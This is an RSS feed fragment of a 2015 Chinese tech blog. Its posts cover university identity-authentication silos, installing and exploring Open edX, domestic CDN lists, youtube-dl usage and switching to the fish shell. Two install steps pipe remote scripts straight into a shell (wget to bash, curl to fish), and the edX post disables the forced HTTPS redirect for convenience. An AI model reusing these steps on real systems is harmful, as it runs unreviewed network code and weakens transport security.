&lt;p&gt;米记是个很单纯善良的男子，他最不单纯善良就是碰上李红。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;李红那种见惯市面的女子，碰到每个人都精刮得寸草不生，见着米记这样一个闲人，心先安了，然后这个单纯男子会为她动心，多少让她感到虚荣吧&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我和她根本不熟，只见过一次面，我不应该听到这样的说话。听到了就好像接受了一件什么贵重礼物，欠了她一个人情&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在一个分离里面，她情愿是留下那一个，留下那一个挥手不用挥得那么用力。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 28 Dec 2015 00:00:00 +0000</pubDate><guid>tag:,2015-12-28:wu-ai-ji.html</guid><category>book</category></item><item><title>教育信息化、信息孤岛与身份认证</title><link>/educational-information-information-island-authentication.html</link><description>&lt;blockquote&gt;
&lt;p&gt;Design programs to be connected to other programs  --Unix philosophy&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;缘起&lt;/h1&gt;
&lt;p&gt;最近接触的项目和需求中，统一身份认证的问题反复出现，花了不少功夫去了解身份认证这块相关的标准和协议。&lt;/p&gt;
&lt;p&gt;身份认证/授权这部分涉及的概念真是五花八门，一度把我搞得七荤八素，相关概念包括但不限于：session，cookie，OpenID，OAuth2，CAS,JWT,SSO,Token，SAML，Shibboleth（以上这些概念并不都在同一层面）&lt;/p&gt;
&lt;p&gt;其中一些属于协议，一些属于实现，一些属于通用的概念。&lt;/p&gt;
&lt;p&gt;最近在和某高校合作的项目中，校方也痛下决心要把校园内各个系统进行打通（教育部有要求避免信息孤岛），在交流中发现，信息孤岛在国内高校中广泛存在，而我自己目前折腾的东西属于教育信息化这个领域，所以觉得相比于技术细节，理清这些问题是更有意义的。&lt;/p&gt;
&lt;h1&gt;问题描述&lt;/h1&gt;
&lt;p&gt;我们首先来看看我们面临的问题&lt;/p&gt;
&lt;p&gt;许多高校每年采购若干教育信息化系统，再加上内部自建的，积年累月，大浪淘下之后，学校里运行着若干异构系统，他们都有一套自己的认证机制，自己的用户系统，某天学校有了新需求，需要若干系统协同合作，却发现整合他们的成本已经高于购置一套新系统的成本（包括时间成本）。&lt;/p&gt;
&lt;p&gt;于是他们用新购的系统解决眼前的业务问题，接着这个新系统风风火火地奔往下一个信息孤岛&lt;/p&gt;
&lt;p&gt;这些教育信息化系统/教务系统进校之初，往往需要先与教务相关的数据中心整合，同步用户以及其他关系，和许多工程项目一样，为了进度采用一种dirty and quick的方案。不同公司的不同系统，与学校数据中心的整合又往往不一样，于是校方整出许多数据视图和接口，应对一直只需，没精力做长期打算，这些临时接口往往是滋生bug，产生臃肿代码，引起错误和需要大量重复劳动的地方。&lt;/p&gt;
&lt;h1&gt;问题分析&lt;/h1&gt;
&lt;p&gt;这些问题的出现，几乎是一种必然。我们知道几乎所有的系统都需要登录访问，访问是有状态的，所以各个系统需要与数据中心整合（获取用户信息），而整合过程中，由于业务的压力，人们往往倾向于一种quick的方案，dirty与否并不再考量范围，更遑论架构上的长远考虑。&lt;/p&gt;
&lt;p&gt;缺乏标准，临时方案，追赶进度，于是盐水越喝越多，越来越渴。&lt;/p&gt;
&lt;p&gt;我觉得解开这团乱码的关键是身份认证与授权，放弃临时方案，而采用一些被广泛采用而健壮灵活的开放标准。在初期架构上花些精力，一劳永逸地解决这些问题。当然由于这些设计的完备和周到，他们也允许最大非侵入式地整合既有系统，尽可能少地干预以及投入使用的系统，是认证层尽量透明。前提是校方真的有决心去推荐这件事&lt;/p&gt;
&lt;p&gt;当然，这个问题倒并不只在高校出现了，企业中也是广泛存在的。实际上只要纯在异构系统，统一身份的需求就很可能出现，由于&lt;code&gt;懒惰是程序员的美德&lt;/code&gt;（这是个玩笑，程序员三大美德里的懒惰当然不是这种愚蠢的懒惰啦），dirty and quick的临时方案就层出不穷&lt;/p&gt;
&lt;h1&gt;思路&lt;/h1&gt;
&lt;p&gt;我认为上述的这些问题，可以把它们视为分布式系统的身份认证问题。&lt;/p&gt;
&lt;p&gt;而在高校中，教务系统（数据库）往往作为认证权威，不同于OAuth解决的分布式认证问题（去中心化），高校信息化系统的身份认证问题可以被简化为集中式身份认证&lt;/p&gt;
&lt;h1&gt;标准和协议的意义&lt;/h1&gt;
&lt;p&gt;有了标准和协议，我们就避免了不必要的争论，而将精力放到真正的问题上。&lt;/p&gt;
&lt;p&gt;比如在大括号是否换行这类问题上，你很难说谁的做法更好，所以换行的一派对待不换行的一派，一贯的做法就是手持火把以异教徒的眼光看待对方。但各执己见的结果是项目整体上的一致性很差。一旦有了标准，许多无谓的争论（而且不可能有结果）就可以避免，这在公司之间的协作上很有意义，否则谁也不愿服谁的方案，而且是任意一方的方案逻辑上都能救得一时之急。&lt;/p&gt;
&lt;p&gt;在选择标准和协议的时候，我们最好尽量选择被业界广泛使用的，这样一来，不仅易于整合进其他优秀的系统（国外许多优秀的系统都会特意说明兼容这些标准，国内这种做法还不多，但据我所知最近已经有一些教育行业的公司开始或准备这么做了）&lt;/p&gt;
&lt;p&gt;采用标准和协议的另一个好处是，许多常见的漏洞可以被避免，这些协议经过广泛的使用，大多的坑都被踩过了，后来者们不仅容易免费获得优秀的实现（诸如CAS有&lt;a href="https://github.com/Jasig/cas"&gt;Jasig/cas&lt;/a&gt;）。我们不必重造车轮，就能获得安全可靠的解决方案，这要比拍脑袋的临时方案健壮得多&lt;/p&gt;
&lt;p&gt;想想我自己之前踩过的坑，多数时候都可以用&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;读书太少而想得太多来&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;来解释&lt;/p&gt;
&lt;p&gt;同时标准和协议是一种可增量式改良的实体，由于这些协议和标准的开放性，用户在使用过程遇到的任何问题，都能被收集与反馈，最后标准和协议被不断完善。它们像生命体一样不断地成长与健壮&lt;/p&gt;
&lt;h1&gt;解决方案&lt;/h1&gt;
&lt;p&gt;顺着身份认证的思路，具体的解决方案倒有很多可选的，诸如CAS,JWT,SAML等，这些具体的协议与解决方案就留在后续文章里来讨论啦。&lt;/p&gt;
&lt;p&gt;在下篇文章里，我们会关注耶鲁大学贡献了CAS协议（CAS是一个协议，并不限于具体语言实现），该协议在国外高校中广泛使用，Open edX就天然支持这种协议，通过该协议，我们轻松就将Open edX与教务系统整合了&lt;/p&gt;
&lt;p&gt;也正是这个经历，让我尝到了标准和协议的甜头，才决定写这一系列的文章&lt;/p&gt;
&lt;h1&gt;另外&lt;/h1&gt;
&lt;p&gt;身份认证并不足以消除信息孤岛，但会是关键的一步&lt;/p&gt;
&lt;p&gt;在折腾Open edX的过程中，我发现RESTful API也是极其有力的工具，通过让系统对外暴露RESTful风格的接口，系统之间变得协作友好，它们如同有了生命体一般，这正是《Unix编程艺术》里建议的，考虑尽量让程序彼此之间能通信，让程序具有组合性，用清晰的接口把若干简单的模块组合成一个复杂的软件。这样是应对复杂度极好的策略&lt;/p&gt;
&lt;p&gt;系统之间的协作，如同你培育的生态球一般，各个生物既互相依存/共生又彼此独立，能量和物质顺着食物链流动，它们形成一个生态系统&lt;/p&gt;
&lt;p&gt;在协作紧密的地方，信息是流通顺畅的，系统之间分工协作，友好相处。信息孤岛就被打破了&lt;/p&gt;
&lt;p&gt;而系统之间的协作，统一的身份往往是最初需要迈出的一步&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 25 Dec 2015 00:00:00 +0000</pubDate><guid>tag:,2015-12-25:educational-information-information-island-authentication.html</guid><category>技术</category></item><item><title>Open edX最新版评测与新特性探索(20151214)</title><link>/try-open-edx-master-20151214.html</link><description>&lt;h1&gt;前言&lt;/h1&gt;
&lt;p&gt;如果不出意外1月中旬，Open edX第四个稳定版Dogwood将发布，这个版本有许多吸引人的新特性，我们这边预计准备升级到这个稳定版，所以在正式发布之前，先踩踩坑，看看新特性&lt;/p&gt;
&lt;h1&gt;安装&lt;/h1&gt;
&lt;p&gt;安装过程和此前并没太大差别&lt;/p&gt;
&lt;p&gt;图方便的话，使用一步安装就行：&lt;code&gt;wget https://raw.githubusercontent.com/edx/configuration/master/util/install/sandbox.sh -O - | bash&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;你当然也可以分步安装，参考&lt;a href="https://github.com/edx/configuration/wiki/edX-Ubuntu-12.04-64-bit-Installation"&gt;edX Ubuntu 12.04 64 bit Installation&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;不过你必须保证国际网络通畅，即便如此你也很可能会出错，下面给出了我遇到的错误以及错误处理&lt;/p&gt;
&lt;h1&gt;问题处理&lt;/h1&gt;
&lt;p&gt;由于pip的升级，可能会遇到一些奇怪的问题，一般而言google一下都能解决的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mysql_config not found&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;解决方案：&lt;code&gt;sudo apt-get install libmysqlclient-dev&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pkg_resources.DistributionNotFound: paramiko&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;解决方案：&lt;code&gt;sudo pip install -U setuptools&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;探索&lt;/h1&gt;
&lt;h3&gt;已有服务&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sudo /edx/bin/supervisorctl status&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;analytics_api                    RUNNING   pid 1594, uptime 3:45:20
certs                            RUNNING   pid 2219, uptime 3:45:07
edx_notes_api                    RUNNING   pid 1597, uptime 3:45:20
edxapp:cms                       RUNNING   pid 6254, uptime 3:34:37
edxapp:lms                       RUNNING   pid 6253, uptime 3:34:37
edxapp_worker:cms_default_4      RUNNING   pid 1678, uptime 3:45:19
edxapp_worker:cms_high_1         RUNNING   pid 1656, uptime 3:45:20
edxapp_worker:cms_low_3          RUNNING   pid 1635, uptime 3:45:20
edxapp_worker:lms_default_3      RUNNING   pid 1650, uptime 3:45:20
edxapp_worker:lms_high_4         RUNNING   pid 1684, uptime 3:45:19
edxapp_worker:lms_high_mem_2     RUNNING   pid 1642, uptime 3:45:20
edxapp_worker:lms_low_1          RUNNING   pid 1665, uptime 3:45:19
forum                            RUNNING   pid 1591, uptime 3:45:20
insights                         RUNNING   pid 1690, uptime 3:45:19
notifier-celery-workers          RUNNING   pid 1593, uptime 3:45:20
notifier-scheduler               RUNNING   pid 1600, uptime 3:45:20
xqueue                           RUNNING   pid 1605, uptime 3:45:20
xqueue_consumer                  RUNNING   pid 1589, uptime 3:45:20
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以看到服务以及很完备了，当然和cypress区别不大,数据分析这块依然没有默认&lt;/p&gt;
&lt;h3&gt;基础组件&lt;/h3&gt;
&lt;p&gt;Django以及升级到1.8.7,这意味着migrate以及不依赖south了！&lt;/p&gt;
&lt;p&gt;&lt;img alt="django18.png" src="img/edx/try_master/django18.png" /&gt;&lt;/p&gt;
&lt;h3&gt;默认使用https&lt;/h3&gt;
&lt;p&gt;其中安装完成后明显的一项是nginx的配置发生了变化，强制使用https，所以默认情况下无法访问，简易的做法是注释&lt;code&gt;/edx/app/nginx/sites-available&lt;/code&gt;里的cms和lms&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#if ($scheme != &amp;quot;https&amp;quot;) {
#rewrite ^ https://$host$uri permanent;
#}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;重启nginx即可:&lt;code&gt;service nginx restart&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;证书&lt;/h3&gt;
&lt;p&gt;&lt;img alt="cert.png" src="img/edx/try_master/cert.png" /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;进入Studio &amp;gt; &lt;code&gt;Advanced Settings&lt;/code&gt; &amp;gt; &lt;code&gt;Certificates Display Behavior&lt;/code&gt; ,填入 &lt;code&gt;early_with_info&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Advanced Settings&lt;/code&gt; &amp;gt; &lt;code&gt;Certificate Web/HTML View Enabled&lt;/code&gt; , 填入 &lt;code&gt;true&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;进入后台为这门课生成证书:&lt;code&gt;sudo -u www-data /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms --settings aws ungenerated_certs -c course-v1:edX+DemoX+Demo_Course --insecure&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;搜索功能&lt;/h3&gt;
&lt;p&gt;&lt;img alt="1" src="img/edx/try_master/search1.png" /&gt;
&lt;img alt="2" src="img/edx/try_master/search2.jpg" /&gt;
&lt;img alt="3" src="img/edx/try_master/search3.png" /&gt;&lt;/p&gt;
&lt;p&gt;edx中的搜索功能及其强大，对于找知识点十分方便，可以搜索课程内部的各类数据，既可以针对某门课程进修内部资料搜索，也可以针对学生的所有选修课程，进行综合搜索&lt;/p&gt;
&lt;p&gt;使用场景参考这里&lt;a href="http://edx.readthedocs.org/projects/open-edx-learner-guide/en/latest/SFD_course_search.html"&gt;Searching the Course&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安装edx-search: &lt;code&gt;pip install -e git+https://github.com/edx/edx-search.git@release-2015-11-17#egg=edx-search&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;启用特性： 在*.env.json中FEATURES里加上 &lt;code&gt;"ENABLE_COURSEWARE_INDEX": true,&lt;/code&gt; 和&lt;code&gt;"ENABLE_LIBRARY_INDEX": true,&lt;/code&gt;,如果加上&lt;code&gt;"ENABLE_COURSE_DISCOVERY": true&lt;/code&gt;,那么首页的搜索功能也将被开启&lt;/li&gt;
&lt;li&gt;在Studio里， 点击&lt;code&gt;Reindex&lt;/code&gt;， 索引完成即可搜索，搜索基于elasticsearch&lt;/li&gt;
&lt;li&gt;在devstack中默认搜索功能，如果需要在生产环境里使用，可以参考devstack.py&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Enabling Custom Courses&lt;/h3&gt;
&lt;p&gt;&lt;img alt="ccx" src="img/edx/try_master/ccx.jpg" /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在*.env.json里添加&lt;code&gt;"CUSTOM_COURSES_EDX": true,&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;restart edxapp:&lt;/li&gt;
&lt;li&gt;进入Studio &amp;gt; &lt;code&gt;Advanced Settings&lt;/code&gt; &amp;gt; &lt;code&gt;Enable CCX&lt;/code&gt; 设置为true&lt;/li&gt;
&lt;li&gt;在lms &amp;gt; &lt;code&gt;Instructor&lt;/code&gt; &amp;gt; &lt;code&gt;COURSE TEAM MANAGEMENT&lt;/code&gt;  选中&lt;code&gt;CCX Coaches&lt;/code&gt; ，添加用户即可&lt;/li&gt;
&lt;li&gt;migrate同步数据：&lt;code&gt;sudo -u www-data /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms migrate --settings aws&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;之后在tab上就会出现&lt;code&gt;CCX Coaches&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;Timed Exams&lt;/h3&gt;
&lt;p&gt;在&lt;code&gt;Advanced Settings&lt;/code&gt;里启用即可&lt;/p&gt;
&lt;p&gt;更多细节参考:  &lt;a href="http://edx.readthedocs.org/projects/open-edx-building-and-running-a-course/en/latest/course_features/timed_exams.html"&gt;Timed    Exams&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;Using Open edX as an LTI Tool Provider&lt;/h3&gt;
&lt;p&gt;这是最令人兴奋的一块了， Open edX可以作为LTI Tool Provider, 如果你一直在关注这块，可以放手开始构建你想构建的体系啦.今天就暂时不写这块的细节了&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://edx.readthedocs.org/projects/open-edx-building-and-running-a-course/en/latest/course_features/lti/index.html"&gt;Using Open edX as an LTI Tool Provider&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://edx.readthedocs.org/projects/edx-installing-configuring-and-running/en/latest/configuration/lti/index.html"&gt;Configuring an edX Instance as an LTI Tool Provider&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 14 Dec 2015 00:00:00 +0000</pubDate><guid>tag:,2015-12-14:try-open-edx-master-20151214.html</guid><category>edx</category></item><item><title>国内静态文件CDN整理</title><link>/static-file-cdn.html</link><description>&lt;h1&gt;资源列表&lt;/h1&gt;
&lt;h3&gt;&lt;a href="http://libs.useso.com/"&gt;360网站卫士常用前端公共库CDN服务&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;常用前端公共库&lt;/li&gt;
&lt;li&gt;google公共库：用以方便地替代google前端库。将Google前端库的域名 ajax.googleapis.com 修改为：ajax.useso.com 即可*  &lt;/li&gt;
&lt;li&gt;google字体库:将Google免费字体库的域名 fonts.googleapis.com 修改为：fonts.useso.com 即可&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;资源缓存在360网站卫士全国的CDN节点上！稳定快速&lt;/p&gt;
&lt;p&gt;ps:可使用sed批量替换&lt;/p&gt;
&lt;h3&gt;&lt;a href="http://www.bootcdn.cn/"&gt;BootCDN&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;稳定、快速、免费的开源项目 CDN 服务.&lt;br /&gt;
共收录了 1612 个开源项目.&lt;/p&gt;
&lt;p&gt;开源库数量丰富，版本齐全。由&lt;a href="http://www.upyun.com/"&gt;upyun&lt;/a&gt;赞助，十分稳定&lt;/p&gt;
&lt;h3&gt;&lt;a href="http://www.staticfile.org/about.html"&gt;staticfile&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;开放静态文件 CDN&lt;/p&gt;
&lt;p&gt;全面收录优秀的开源库，并免费为之提供 CDN 加速服务。也提供开源库源接入的入口，让所有人都可以提交开源库&lt;/p&gt;
&lt;p&gt;国外源同步于 CDNJS&lt;/p&gt;
&lt;p&gt;由七牛云赞助&lt;/p&gt;
&lt;h3&gt;百度 CDN&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://developer.baidu.com/wiki/index.php?title=docs/cplat/libs"&gt;百度 CDN公共库&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://cdn.code.baidu.com/"&gt;百度静态资源公共库&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a href="http://jscdn.upai.com/"&gt;常用JavaScript库CDN服务&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;又拍云托管的常用JavaScript库。资源较少&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://cdnjs.com/"&gt;cdnjs.com&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;资源丰富，国内访问速度也还行&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 10 Dec 2015 00:00:00 +0000</pubDate><guid>tag:,2015-12-10:static-file-cdn.html</guid><category>技术</category></item><item><title>youtube-dl使用记录</title><link>/youtube-dl-note.html</link><description>&lt;h1&gt;缘起&lt;/h1&gt;
&lt;p&gt;最近在跟着一些资料学习数据分析，时常会连接到youtube，要看些演讲之类的，想下载下来看。有朋友也在学习这块知识，所以最理想是把视频放到国内云上，这样可以分享给小伙伴&lt;/p&gt;
&lt;h1&gt;思路&lt;/h1&gt;
&lt;p&gt;恰好有服务器在国外，所以想做个自动化的工作，大体思路是&lt;/p&gt;
&lt;p&gt;写个网页收集下载链接，然后后台触发celery去执行任务，任务里使用&lt;a href="https://github.com/rg3/youtube-dl"&gt;youtube-dl&lt;/a&gt;去下载视频，下载完后使用&lt;a href="https://github.com/houtianze/bypy"&gt;bypy&lt;/a&gt;同步到百度云盘，然后发一封邮件通知视频下载者。&lt;/p&gt;
&lt;p&gt;关于同步到云盘和邮件通知这部分我之前在&lt;a href="https://github.com/wwj718/for_dinner"&gt;for_dinner&lt;/a&gt;里写过&lt;/p&gt;
&lt;p&gt;所以这次任务不算太难，写个建议的表单页面，熟悉使用&lt;a href="https://github.com/rg3/youtube-dl"&gt;youtube-dl&lt;/a&gt;就行了。&lt;/p&gt;
&lt;h3&gt;dirty and quick&lt;/h3&gt;
&lt;p&gt;我们也可以简化以上流程，一种建议的不那么自动化的方式是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;小伙伴把想下载的视频微信告诉你&lt;/li&gt;
&lt;li&gt;你去国外vps上使用youtube-dl把视频下载下来&lt;/li&gt;
&lt;li&gt;之后使用FTP把视频拖回本地&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;a href="https://github.com/rg3/youtube-dl"&gt;youtube-dl&lt;/a&gt;&lt;/h1&gt;
&lt;h2&gt;what&lt;/h2&gt;
&lt;p&gt;youtube-dl是一个简单的命令行下载工具，支持全球上百个视频网站的下载，包括国内主流视频网站资源，无须注册，无须付费，无须登录，智能嗅探出真实下载地址。据官网介绍，youtube-dl甚至支持全球最大的成人视频网站免费下载。&lt;/p&gt;
&lt;p&gt;具体列表可通过&lt;code&gt;youtube-dl --extractor-descriptions&lt;/code&gt;查看&lt;/p&gt;
&lt;p&gt;我使用wc统计了下（&lt;code&gt;youtube-dl --extractor-descriptions|wc -l&lt;/code&gt;），一共可以下载国内外714个视频源的视频/音频。&lt;/p&gt;
&lt;p&gt;此外前头说的官网介绍属实！&lt;/p&gt;
&lt;p&gt;可供下载的国内一些著名音视频源包括：优酷/百度视频/音悦Tai/QQ音乐/网易云音乐/酷我音乐&lt;/p&gt;
&lt;h2&gt;安装&lt;/h2&gt;
&lt;p&gt;sudo pip install youtube-dl&lt;/p&gt;
&lt;h2&gt;使用&lt;/h2&gt;
&lt;h3&gt;帮助&lt;/h3&gt;
&lt;p&gt;youtube-dl --help&lt;/p&gt;
&lt;h3&gt;常用命令&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;youtube-dl --list-extractors #查看支持网站列表 &lt;/li&gt;
&lt;li&gt;youtube-dl -U #程序升级 &lt;/li&gt;
&lt;li&gt;youtube-dl --get-format URL #获取视频格式 &lt;/li&gt;
&lt;li&gt;youtube-dl -F URL #获取所有格式（目前仅支持YouTube）&lt;/li&gt;
&lt;li&gt;youtube-dl -f format URL #下载指定格式的视频，这里以下载1080p原画质量的视频格式为例: youtube-dl -f 137 https://www.youtube.com/watch?v=Izj_F8r2yt0&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;demo&lt;/h3&gt;
&lt;p&gt;我们以下载&lt;a href="https://www.youtube.com/watch?v=CoxjADZHUQA"&gt;Role of Python in Data Science and Machine Learning&lt;/a&gt;(地址：https://www.youtube.com/watch?v=CoxjADZHUQA)为例&lt;/p&gt;
&lt;p&gt;因为YouTube的video 和 audio 部分是分开的，所以这里要用到 ffmpeg 这个神器来合并视频和音频：&lt;code&gt;sudo apt-get install ffmpeg&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;youtube-dl -F " youtube-dl -F "&lt;/code&gt;,输出：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[youtube] CoxjADZHUQA: Downloading webpage
[youtube] CoxjADZHUQA: Downloading video info webpage
[youtube] CoxjADZHUQA: Extracting video information
[youtube] CoxjADZHUQA: Downloading DASH manifest
[youtube] CoxjADZHUQA: Downloading DASH manifest
[info] Available formats for CoxjADZHUQA:
format code  extension  resolution note
140          m4a        audio only DASH audio   99k , m4a_dash container, aac  @128k (44100Hz), 29.96MiB
141          m4a        audio only DASH audio  195k , m4a_dash container, aac  @256k (44100Hz), 59.79MiB
160          mp4        256x144    DASH video  119k , avc1.4d400c, 13fps, video only, 34.22MiB
133          mp4        426x240    DASH video  258k , avc1.4d4015, 25fps, video only, 76.12MiB
134          mp4        640x360    DASH video  605k , avc1.4d401e, 25fps, video only, 77.20MiB
135          mp4        854x480    DASH video 1104k , avc1.4d401e, 25fps, video only, 160.60MiB
136          mp4        1280x720   DASH video 2205k , avc1.4d401f, 25fps, video only, 322.11MiB
137          mp4        1920x1080  DASH video 4127k , avc1.640028, 25fps, video only, 632.46MiB
17           3gp        176x144    small ,  mp4a.40.2, mp4v.20.3
36           3gp        320x240    small ,  mp4a.40.2, mp4v.20.3
5            flv        400x240    small
43           webm       640x360    medium ,  vorbis, vp8.0
18           mp4        640x360    medium ,  mp4a.40.2, avc1.42001E
22           mp4        1280x720   hd720 ,  mp4a.40.2, avc1.64001F (best)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;选定音视频质量后（比如我们选择160对应的视频，141对于的音频），开始下载： &lt;code&gt;youtube-dl  -f 160+141  "https://www.youtube.com/watch?v=CoxjADZHUQA"&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;输出为:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;youtube] CoxjADZHUQA: Downloading webpage
[youtube] CoxjADZHUQA: Downloading video info webpage
[youtube] CoxjADZHUQA: Extracting video information
[youtube] CoxjADZHUQA: Downloading DASH manifest
[youtube] CoxjADZHUQA: Downloading DASH manifest
[download] Destination: PyCon Ukraine 2014 - Jeremy Achin - Role of Python in Data Science and Machine Learning-CoxjADZHUQA.f160.mp4
[download] 100% of 34.22MiB in 00:09
[download] Destination: PyCon Ukraine 2014 - Jeremy Achin - Role of Python in Data Science and Machine Learning-CoxjADZHUQA.f141.m4a
[download] 100% of 59.79MiB in 00:12
[ffmpeg] Merging formats into &amp;quot;PyCon Ukraine 2014 - Jeremy Achin - Role of Python in Data Science and Machine Learning-CoxjADZHUQA.mp4&amp;quot;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;下载完毕！&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/rg3/youtube-dl"&gt;rg3/youtube-dl&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 04 Dec 2015 00:00:00 +0000</pubDate><guid>tag:,2015-12-04:youtube-dl-note.html</guid><category>技术</category></item><item><title>从zsh切换到fish</title><link>/from-zsh-to-fish.html</link><description>&lt;p&gt;大半年来在服务器上，一直用fish&lt;/p&gt;
&lt;p&gt;最近下定决心把mac上的&lt;a href="https://github.com/zsh-users/zsh"&gt;zsh&lt;/a&gt;也替换为&lt;a href="https://github.com/fish-shell/fish-shell"&gt;fish&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;两者的差异并没太大，当然都比bash好用得多 :），fish给我感觉更轻巧和fashion些&lt;/p&gt;
&lt;h1&gt;zsh&lt;/h1&gt;
&lt;p&gt;zsh用了1年多了，最初对扩展语法不熟，写了些乱七八糟的东西，导致现在运行起来很慢，也不想去修复了（这主要怪我）。再者每次cd进入中文文件夹，都报编码错误，好几次因此在同事面前装逼失败，很是忧伤（这也是我决定放弃zsh的主要原因之一）&lt;/p&gt;
&lt;p&gt;给它截个图留念好了&lt;/p&gt;
&lt;p&gt;&lt;img alt="zsh" src="img/tools/zsh.jpeg" /&gt;&lt;/p&gt;
&lt;h1&gt;fish&lt;/h1&gt;
&lt;p&gt;fish正如它的全称&lt;code&gt;Friendly Interactive Shell&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;fish的好处之一是安装配置都极其简易，而且装上就能用中文，不需要对系统做配置之类的，所以每当ssh到新的服务器，第一件事就是装上fish&lt;/p&gt;
&lt;p&gt;其次fish现代感十足，开箱可用可用的大多数功能都贴心之极&lt;/p&gt;
&lt;p&gt;当当当当：&lt;/p&gt;
&lt;p&gt;&lt;img alt="fish" src="img/tools/fish.jpeg" /&gt;&lt;/p&gt;
&lt;h2&gt;安装fish和oh-my-fish&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;brew install fish
curl -L https://github.com/oh-my-fish/oh-my-fish/raw/master/bin/install &lt;span class="p"&gt;|&lt;/span&gt; fish
omf &lt;span class="nb"&gt;help&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;设置fish为默认shell&lt;/h2&gt;
&lt;p&gt;chsh -s /usr/local/bin/fish&lt;/p&gt;
&lt;p&gt;在mac下的iTerm2里，你需要打开： &lt;code&gt;iTerm2 &amp;gt; Preferences &amp;gt; Profiles&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在Command里写入&lt;code&gt;/usr/local/bin/fish&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;与tmux整合&lt;/h2&gt;
&lt;p&gt;在&lt;code&gt;~/.tmux.conf&lt;/code&gt;里加上：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;set -g default-command /usr/local/bin/fish&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;vim模式&lt;/h2&gt;
